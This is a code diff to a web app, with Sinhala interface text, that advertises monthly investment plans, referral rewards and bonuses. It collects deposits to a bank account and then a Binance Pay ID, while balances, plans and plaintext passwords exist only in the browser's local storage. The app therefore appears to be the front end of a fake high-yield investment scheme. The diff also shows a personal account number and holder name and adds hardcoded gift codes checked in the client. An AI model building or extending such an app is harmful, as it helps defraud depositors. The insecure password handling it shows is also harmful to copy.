@@ -95,6 +95,8 @@
         .guide-step { display: flex; align-items: flex-start; margin-bottom: 12px; font-size: 12px; }
         .guide-icon { background: var(--border-color); color: var(--secondary); width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px; flex-shrink: 0; font-weight: bold; transition: background 0.3s; }
         body.dark-mode .guide-icon { background: #334155; }
+
+        .redeem-box { background: var(--card-bg); padding: 20px; border-radius: 20px; margin: 20px; border: 1px dashed var(--secondary); }
     </style>
 </head>
 <body>
@@ -115,14 +117,14 @@
         <div style="background: rgba(255, 255, 255, 0.96); padding: 30px; border-radius: 28px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); max-width: 400px; margin: 0 auto; backdrop-filter: blur(10px);">
             <div id="login-form">
                 <h3 style="margin-top:0; color: #0f172a;">Login</h3>
-                <input type="number" id="l-phone" placeholder="Phone Number" style="background:white; color:#0f172a; border-color:#e2e8f0;">
+                <input type="email" id="l-phone" placeholder="Email Address" style="background:white; color:#0f172a; border-color:#e2e8f0;">
                 <input type="password" id="l-pass" placeholder="Password" style="background:white; color:#0f172a; border-color:#e2e8f0;">
                 <button class="btn-action" onclick="login()">LOGIN</button>
                 <p onclick="document.getElementById('login-form').style.display='none';document.getElementById('reg-form').style.display='block';" style="font-size:12px; margin-top:15px; color:var(--secondary); cursor: pointer; font-weight: 600;">Don't have an account? Register</p>
             </div>
             <div id="reg-form" style="display:none;">
                 <h3 style="margin-top:0; color: #0f172a;">Create Account</h3>
-                <input type="number" id="r-phone" placeholder="Phone Number" style="background:white; color:#0f172a; border-color:#e2e8f0;">
+                <input type="email" id="r-phone" placeholder="Email Address" style="background:white; color:#0f172a; border-color:#e2e8f0;">
                 <input type="password" id="r-pass" placeholder="Password" style="background:white; color:#0f172a; border-color:#e2e8f0;">
                 <input type="text" id="r-ref" placeholder="Referral Code (Optional)" style="background:white; color:#0f172a; border-color:#e2e8f0;">
                 <button class="btn-action" onclick="register()">REGISTER</button>
@@ -190,7 +192,6 @@
 
     <section id="market" class="page">
         <h3 style="padding:20px;">Monthly Investment Plans</h3>
-        <p style="padding:0 20px; font-size:12px; color:var(--text-muted);">සටහන: දිනපතා ලාභය පෙන්වන අතර දින 30 කට පසු සම්පූර්ණ මුදල Wallet එකට එකතු වේ.</p>
         <div style="padding: 0 20px;" id="market-list"></div>
     </section>
 
@@ -199,7 +200,7 @@
             <div style="display:flex; align-items:center;">
                 <div style="width:50px; height:50px; background:rgba(255,255,255,0.2); border-radius:50%; display:flex; align-items:center; justify-content:center;"><i class="fas fa-user"></i></div>
                 <div style="margin-left:15px;">
-                    <h2 id="u-phone" style="margin:0; font-size:16px;">07xxxxxxxx</h2>
+                    <h2 id="u-phone" style="margin:0; font-size:16px;">email@example.com</h2>
                     <small>Verified Member</small>
                 </div>
             </div>
@@ -207,6 +208,12 @@
                 <div><small>Balance</small><div id="p-bal" style="font-weight:700;">Rs. 0</div></div>
                 <div style="text-align:right;"><small>Code</small><div id="u-ref-code" style="font-weight:700;">---</div></div>
             </div>
+        </div>
+
+        <div class="redeem-box">
+            <h4 style="margin:0 0 10px 0; font-size:14px;"><i class="fas fa-gift" style="color:#ef4444;"></i> Redeem Gift Code</h4>
+            <input type="text" id="gift-code-input" placeholder="Enter Admin Gift Code">
+            <button class="btn-action" onclick="redeemGiftCode()" style="background:linear-gradient(135deg, #ef4444, #f43f5e);">REDEEM NOW</button>
         </div>
 
         <div class="action-grid">
@@ -224,14 +231,16 @@
     <section id="deposit" class="page">
         <div style="padding:20px;">
             <h3>Deposit</h3>
-            <button class="btn-action" onclick="toggleBank()" style="background: var(--primary); color: var(--light); margin-bottom: 10px;">DEPOSIT METHOD (BANK DETAILS)</button>
+            <button class="btn-action" onclick="toggleBank()" style="background: var(--primary); color: var(--light); margin-bottom: 10px;">PAYMENT DETAILS</button>
             <div id="bank-box" class="bank-info">
-                <strong>Account Number:</strong> 94591300<br>
-                <strong>Bank:</strong> BOC<br>
-                <strong>Name:</strong> R.A.P.V.LAKSHAN
+                <div style="display:flex; justify-content:space-between; align-items:center; background:rgba(0,0,0,0.05); padding:10px; border-radius:10px;">
+                    <span><strong>Binance Pay ID:</strong> <span id="binance-id">123456</span></span>
+                    <button onclick="copyID()" style="background:var(--secondary); color:white; border:none; padding:5px 10px; border-radius:5px; font-size:10px; cursor:pointer;"><i class="fas fa-copy"></i> COPY</button>
+                </div>
+                <small style="display:block; margin-top:8px; font-size:10px; color:var(--text-muted);">* කරුණාකර ඉහත ID එකට මුදල් එවා එහි Transaction ID එක පහත ඇතුළත් කරන්න.</small>
             </div>
             <input type="number" id="d-amt" placeholder="Deposit Amount">
-            <input type="number" id="d-reg-phone" placeholder="Register Phone Number">
+            <input type="email" id="d-reg-phone" placeholder="Registered Email Address">
             <input type="text" id="d-ref" placeholder="Transaction ID">
             <small style="color:var(--text-muted);">Upload Transaction Slip:</small>
             <input type="file" id="d-slip" accept="image/*" style="border:none; padding:10px 0; color:var(--text-muted);">
@@ -297,16 +306,23 @@
         box.style.display = box.style.display === 'block' ? 'none' : 'block';
     }
 
+    function copyID() {
+        const idText = document.getElementById('binance-id').innerText;
+        navigator.clipboard.writeText(idText).then(() => {
+            alert("Binance Pay ID copied: " + idText);
+        });
+    }
+
     function save() { localStorage.setItem(USERS_KEY, JSON.stringify(users)); }
 
     function register() {
         const phone = document.getElementById('r-phone').value;
         const pass = document.getElementById('r-pass').value;
         const refBy = document.getElementById('r-ref').value;
-        if(phone.length < 10) return alert("Invalid Phone");
+        if(!phone.includes('@')) return alert("Invalid Email Address");
         const myCode = "SKY" + Math.floor(1000 + Math.random() * 9000);
         if(refBy) { let inv = users.find(u=>u.refCode===refBy); if(inv) inv.bal+=100; }
-        users.push({ phone, pass, refCode: myCode, bal: 0, activePlans: [], requests: [], lastBonus: 0 });
+        users.push({ phone, pass, refCode: myCode, bal: 0, activePlans: [], requests: [], lastBonus: 0, usedCodes: [], bonusClaimed: false });
         save(); alert("Success!"); location.reload();
     }
 
@@ -388,6 +404,25 @@
         save(); updateUI(); alert(name + " ආයෝජනය සාර්ථකයි! දින 30 කින් ලාභය ලැබෙනු ඇත."); nav('home');
     }
 
+    function redeemGiftCode() {
+        const inputCode = document.getElementById('gift-code-input').value.trim();
+        const user = users.find(u => u.phone === currentUser.phone);
+        if(!inputCode) return alert("කරුණාකර Gift Code එක ඇතුළත් කරන්න.");
+        const validCodes = ["SKYPRO10", "FREEGIFT", "ADMIN2026", "WIN123"];
+        if(validCodes.includes(inputCode)) {
+            if(!user.usedCodes) user.usedCodes = [];
+            if(user.usedCodes.includes(inputCode)) return alert("ඔබ දැනටමත් මෙම Code එක භාවිතා කර ඇත.");
+            let randomAmt = Math.floor(Math.random() * (20 - 10 + 1)) + 10;
+            user.bal += randomAmt;
+            user.usedCodes.push(inputCode);
+            user.requests.unshift({ type: 'Gift', amount: randomAmt, status: 'success', time: Date.now() });
+            save(); updateUI(); alert("සාර්ථකයි! ඔබට රු. " + randomAmt + " ක තෑගි මුදලක් ලැබුණා.");
+            document.getElementById('gift-code-input').value = "";
+        } else {
+            alert("අවලංගු Gift Code එකකි.");
+        }
+    }
+
     function submitReq(type) {
         let user = users.find(u => u.phone === currentUser.phone);
         if(type === 'deposit') {
@@ -410,9 +445,13 @@
 
     function getDailyBonus() {
         let user = users.find(u => u.phone === currentUser.phone);
-        if(Date.now() - user.lastBonus < 86400000) return alert("නැවත ලබා ගැනීමට පැය 24ක් ඉන්න.");
-        user.bal += 200; user.lastBonus = Date.now();
-        save(); updateUI(); alert("Daily Bonus Claimed!");
+        if(user.bonusClaimed) {
+            return alert("මෙම රු. 200 ප්‍රසාද දීමනාව (Bonus) ලබාගත හැක්කේ එක් වරක් පමණි.");
+        }
+        user.bal += 200; 
+        user.bonusClaimed = true; 
+        save(); updateUI(); 
+        alert("සාර්ථකයි! ඔබට රු. 200 ප්‍රසාද දීමනාව ලැබුණා.");
     }
 
     function nav(id, el) {
